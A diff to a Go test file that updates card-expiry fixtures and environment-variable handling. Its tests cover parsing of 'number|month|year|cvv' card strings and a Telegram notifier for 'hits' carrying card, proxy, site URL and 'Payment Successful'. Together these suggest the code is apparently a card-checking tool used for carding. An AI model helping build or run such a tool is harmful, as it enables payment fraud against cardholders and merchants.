@@ -136,17 +136,17 @@ func TestParseCard(t *testing.T) {
 		wantCC  string
 		wantMM  string
 	}{
-		{"pipe separator", "4111111111111111|12|25|123", false, "4111111111111111", "12"},
-		{"slash separator", "4111111111111111/12/25/123", false, "4111111111111111", "12"},
-		{"space separator", "4111111111111111 12 25 123", false, "4111111111111111", "12"},
-		{"single-digit month", "4111111111111111|3|25|123", false, "4111111111111111", "03"},
-		{"4-digit year", "4111111111111111|12|2025|123", false, "4111111111111111", "12"},
-		{"amex 4-digit cvv", "378282246310005|12|25|1234", false, "378282246310005", "12"},
-		{"invalid month 13", "4111111111111111|13|25|123", true, "", ""},
-		{"invalid month 0", "4111111111111111|00|25|123", true, "", ""},
-		{"too short cc", "4111|12|25|123", true, "", ""},
-		{"too long cc", "41111111111111111111|12|25|123", true, "", ""},
-		{"non-digit cc", "4111abcd1111111|12|25|123", true, "", ""},
+		{"pipe separator", "4111111111111111|12|30|123", false, "4111111111111111", "12"},
+		{"slash separator", "4111111111111111/12/30/123", false, "4111111111111111", "12"},
+		{"space separator", "4111111111111111 12 30 123", false, "4111111111111111", "12"},
+		{"single-digit month", "4111111111111111|3|30|123", false, "4111111111111111", "03"},
+		{"4-digit year", "4111111111111111|12|2030|123", false, "4111111111111111", "12"},
+		{"amex 4-digit cvv", "378282246310005|12|30|1234", false, "378282246310005", "12"},
+		{"invalid month 13", "4111111111111111|13|30|123", true, "", ""},
+		{"invalid month 0", "4111111111111111|00|30|123", true, "", ""},
+		{"too short cc", "4111|12|30|123", true, "", ""},
+		{"too long cc", "41111111111111111111|12|30|123", true, "", ""},
+		{"non-digit cc", "4111abcd1111111|12|30|123", true, "", ""},
 		{"too few parts", "4111111111111111|12|25", true, "", ""},
 		{"empty", "", true, "", ""},
 	}
@@ -682,6 +682,7 @@ func TestParseAmountParamMaxBound(t *testing.T) {
 
 	// Raise the cap via env var
 	t.Setenv("MAX_AMOUNT", "500000")
+	initMaxAmount()
 	if v, _, err := parseAmountParam("250000"); err != nil {
 		t.Errorf("amount 250000 should be accepted after raising MAX_AMOUNT, got err: %v", err)
 	} else if v != 250000.0 {
@@ -690,6 +691,7 @@ func TestParseAmountParamMaxBound(t *testing.T) {
 
 	// Lower the cap via env var
 	t.Setenv("MAX_AMOUNT", "10")
+	initMaxAmount()
 	if _, _, err := parseAmountParam("50"); err == nil {
 		t.Errorf("amount 50 should be rejected after lowering MAX_AMOUNT to 10")
 	}
@@ -760,62 +762,62 @@ func TestExtractPathParams(t *testing.T) {
 	}{
 		{
 			name:       "no params, just card",
-			input:      "4111111111111111|12|25|123",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{},
 		},
 		{
 			name:       "amount only",
-			input:      "4111111111111111|12|25|123&amount=5",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&amount=5",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"amount": "5"},
 		},
 		{
 			name:       "amount + currency",
-			input:      "4111111111111111|12|25|123&amount=5&currency=USD",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&amount=5&currency=USD",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"amount": "5", "currency": "USD"},
 		},
 		{
 			name:       "currency only",
-			input:      "4111111111111111|12|25|123&currency=INR",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&currency=INR",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"currency": "INR"},
 		},
 		{
 			name:       "paise amount",
-			input:      "4111111111111111|12|25|123&amount=500p",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&amount=500p",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"amount": "500p"},
 		},
 		{
 			name:       "extra unknown params ignored gracefully",
-			input:      "4111111111111111|12|25|123&amount=5&foo=bar&currency=USD",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&amount=5&foo=bar&currency=USD",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"amount": "5", "foo": "bar", "currency": "USD"},
 		},
 		{
 			name:       "key with no value",
-			input:      "4111111111111111|12|25|123&amount",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&amount",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{},
 		},
 		{
 			name:       "trailing & with no content",
-			input:      "4111111111111111|12|25|123&",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{},
 		},
 		{
 			name:       "case-insensitive keys (uppercase)",
-			input:      "4111111111111111|12|25|123&AMOUNT=5&CURRENCY=USD",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&AMOUNT=5&CURRENCY=USD",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"amount": "5", "currency": "USD"},
 		},
 		{
 			name:       "mixed case keys",
-			input:      "4111111111111111|12|25|123&Amount=5&Currency=USD",
-			wantCard:   "4111111111111111|12|25|123",
+			input:      "4111111111111111|12|30|123&Amount=5&Currency=USD",
+			wantCard:   "4111111111111111|12|30|123",
 			wantParams: map[string]string{"amount": "5", "currency": "USD"},
 		},
 	}
@@ -1028,7 +1030,7 @@ func TestHtmlEscapeTg(t *testing.T) {
 		{"a & b", "a &amp; b"},
 		{"a < b > c & d", "a &lt; b &gt; c &amp; d"},
 		{"already &amp; escaped", "already &amp;amp; escaped"}, // double-escape is intentional/correct
-		{"4111|12|25|123", "4111|12|25|123"},                   // card format unchanged
+		{"4111|12|30|123", "4111|12|30|123"},                   // card format unchanged
 		{"résumé café", "résumé café"},                         // unicode unchanged
 		{`{"json":"value"}`, `{"json":"value"}`},               // " NOT escaped — Telegram only treats <, >, & as special
 	}
@@ -1048,7 +1050,7 @@ func TestNotifyHitAsyncNoOpWhenDisabled(t *testing.T) {
 	defer func() { tgNotifyEnabled = false }()
 
 	p := tgHitPayload{
-		Card: "4111|12|25|123", Amount: 5, Currency: "INR",
+		Card: "4111|12|30|123", Amount: 5, Currency: "INR",
 		Message: "Payment Successful", Proxy: "test", SiteURL: "https://example.com",
 		Timestamp: time.Now(),
 	}
@@ -1134,7 +1136,7 @@ func TestNotifyHitAsyncEnqueuesWhenEnabled(t *testing.T) {
 empty:
 
 	p := tgHitPayload{
-		Card: "4111|12|25|123", Amount: 5, Currency: "INR",
+		Card: "4111|12|30|123", Amount: 5, Currency: "INR",
 		Message: "Payment Successful", Proxy: "test", SiteURL: "https://example.com",
 		Timestamp: time.Now(),
 	}
@@ -1203,7 +1205,7 @@ func TestInitTelegramNotifierAutoEnable(t *testing.T) {
 func TestTgHitPayloadStruct(t *testing.T) {
 	// Sanity check: the struct has all expected fields with correct types
 	p := tgHitPayload{
-		Card:      "4111111111111111|12|25|123",
+		Card:      "4111111111111111|12|30|123",
 		Amount:    5.0,
 		Currency:  "INR",
 		Message:   "Payment Successful",
@@ -1212,7 +1214,7 @@ func TestTgHitPayloadStruct(t *testing.T) {
 		Timestamp: time.Date(2026, 1, 15, 14, 30, 0, 0, time.UTC),
 	}
 
-	if p.Card != "4111111111111111|12|25|123" {
+	if p.Card != "4111111111111111|12|30|123" {
 		t.Errorf("Card = %q", p.Card)
 	}
 	if p.Amount != 5.0 {
